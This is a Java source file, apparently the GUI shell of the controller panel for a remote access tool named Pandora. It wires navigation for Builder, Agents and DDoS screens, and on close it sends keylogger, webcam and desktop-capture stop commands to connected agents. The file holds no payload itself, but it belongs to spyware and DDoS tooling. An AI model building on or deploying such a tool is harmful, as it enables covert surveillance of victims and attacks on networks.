package org.pandora.master.builder.impl.scene;

import animatefx.animation.FadeOut;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.image.Image;
import javafx.scene.layout.*;
import javafx.scene.paint.Color;
import lombok.Getter;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.scene.SceneManager;
import org.pandora.master.scene.impl.agent.Keylogger;
import org.pandora.master.scene.impl.agent.Webcam;
import org.pandora.master.scene.SceneType;
import org.pandora.master.utils.Settings;

import java.awt.*;
import java.io.File;
import java.io.IOException;

public class BasicBuilder {

    @Getter
    private final AnchorPane anchorPane;
    @Getter
    private final Scene scene;
    @Getter
    private final BuilderManager builderManager;
    @Getter
    private final Button home;
    @Getter
    private final Button builder;
    @Getter
    private final Button agents;
    @Getter
    private final Button ddos;
    @Getter
    private final Button settings;
    @Getter
    private final Button download;
    @Getter
    private final Label connection;

    public BasicBuilder(final SceneManager sceneManager, final BuilderManager builderManager, final String name) {
        final AnchorPane anchorPane = new AnchorPane();

        final Scene scene = new Scene(anchorPane);
        scene.setFill(Color.TRANSPARENT);

        this.home = builderManager.getButtonBuilder().buildButton(null, "Home", 300, 0, Color.rgb(126, 127, 142), "Verdana", 14, 92, 64, "navButton");
        this.builder = builderManager.getButtonBuilder().buildButton(null, "Builder", 400, 0, Color.rgb(126, 127, 142), "Verdana", 14, 92, 64, "navButton");
        this.agents = builderManager.getButtonBuilder().buildButton(null, "Agents", 500, 0, Color.rgb(126, 127, 142), "Verdana", 14, 92, 64, "navButton");
        this.ddos = builderManager.getButtonBuilder().buildButton(null, "DDoS", 600, 0, Color.rgb(126, 127, 142), "Verdana", 14, 92, 64, "navButton");
        this.settings = builderManager.getButtonBuilder().buildButton(null, "Settings", 700, 0, Color.rgb(126, 127, 142), "Verdana", 14, 92, 64, "navButton");
        this.download = builderManager.getButtonBuilder().buildButton(null, "Downloads", 815, 0, Color.rgb(126, 127, 142), "Verdana", 14, 100, 64, "navButton");

        this.addDefaultController(sceneManager, this.home, "home", name);
        this.addDefaultController(sceneManager, this.builder, "builder", name);
        this.addDefaultController(sceneManager, this.agents, "agents", name);
        this.addDefaultController(sceneManager, this.ddos, "ddos", name);
        this.addDefaultController(sceneManager, this.settings, "settings", name);
        this.addDefaultController(sceneManager, this.download, "downloads", name);

        final Pane minimize = builderManager.getPaneBuilder().buildPane(991, 0, 42, 30, null);
        final Pane close = builderManager.getPaneBuilder().buildPane(1033, 0, 47, 30, null);

        final Label build = builderManager.getLabelBuilder().buildLabel(Settings.BUILD, 1002, 657, Color.rgb(120, 121, 133), "Verdana", 9);
        this.connection = builderManager.getLabelBuilder().buildLabel("Connecting", 8, 657, Color.rgb(120, 121, 133), "Verdana", 9);
        final Label menuName = builderManager.getLabelBuilder().buildLabel(name, 65, 90, Color.rgb(189, 190, 207), "Verdana", 21);

        minimize.setOnMouseClicked(event -> sceneManager.getStage().setIconified(true));
        close.setOnMouseClicked(event -> {
            sceneManager.getMaster().getStageManager().getControllers().keySet().forEach(controller -> {
                final Object object = sceneManager.getMaster().getStageManager().getScenes().get(controller);
                if (controller.getSceneType() == SceneType.KEYLOGGER && object instanceof Keylogger)
                    sceneManager.getMaster().getSocketUtils().write(((Keylogger) object).getAgentData().getId(), "keylogger:stop");
                if (controller.getSceneType() == SceneType.WEBCAM && object instanceof Webcam)
                    sceneManager.getMaster().getSocketUtils().write(((Webcam) object).getAgentData().getId(), "webcam:stop");
                if (controller.getSceneType() == SceneType.DESKTOP && object instanceof org.pandora.master.scene.impl.agent.Desktop) {
                    final org.pandora.master.scene.impl.agent.Desktop desktop = ((org.pandora.master.scene.impl.agent.Desktop) object);
                    sceneManager.getMaster().getSocketUtils().write(desktop.getAgentData().getId(), "desktop:state:stop:" + desktop.getControllerBuilder().screen);
                }
            });
            new FadeOut(anchorPane).play();
            System.exit(0);

        });
        minimize.setId("minimize");
        close.setId("close");

        anchorPane.getChildren().addAll(build, this.connection, menuName, close, minimize, this.home, this.builder, this.agents, this.ddos, this.settings, this.download);

        anchorPane.setBackground(new Background(new BackgroundImage(new Image("images/background/default.png", 1080, 670, false, true), BackgroundRepeat.NO_REPEAT, BackgroundRepeat.NO_REPEAT, BackgroundPosition.DEFAULT, BackgroundSize.DEFAULT)));
        anchorPane.setOpacity(1.0);

        sceneManager.getConnectionInfo().add(this.connection);
        this.builderManager = builderManager;
        this.anchorPane = anchorPane;
        this.scene = scene;
    }

    private void addDefaultController(final SceneManager sceneManager, final Button button, final String buttonName, final String sceneName) {
        button.setOnMouseClicked(event -> {
            if (!buttonName.equalsIgnoreCase(sceneName)) {
                switch (buttonName.toLowerCase()) {
                    case "home": {
                        sceneManager.switchScene(sceneManager.getHomeUI().getScene());
                        break;
                    }
                    case "agents": {
                        sceneManager.switchScene(sceneManager.getAgentsUI().getScene());
                        break;
                    }
                    case "builder": {
                        sceneManager.switchScene(sceneManager.getBuilderUI().getScene());
                        break;
                    }
                    case "ddos": {
                        sceneManager.switchScene(sceneManager.getDdosUI().getScene());
                        break;
                    }
                    case "settings": {
                        sceneManager.switchScene(sceneManager.getSettingsUI().getScene());
                        break;
                    }
                    case "downloads": {
                        final Desktop desktop = Desktop.getDesktop();
                        File dirToOpen = new File(sceneManager.getFileUtils().getValue("download"));
                        try {
                            desktop.open(dirToOpen);
                        } catch (IllegalArgumentException | IOException exception) {
                            System.out.println("File not found (" + dirToOpen.getAbsolutePath() + ") - " + exception.getMessage());
                        }
                        break;
                    }
                }
            }
        });
    }
}
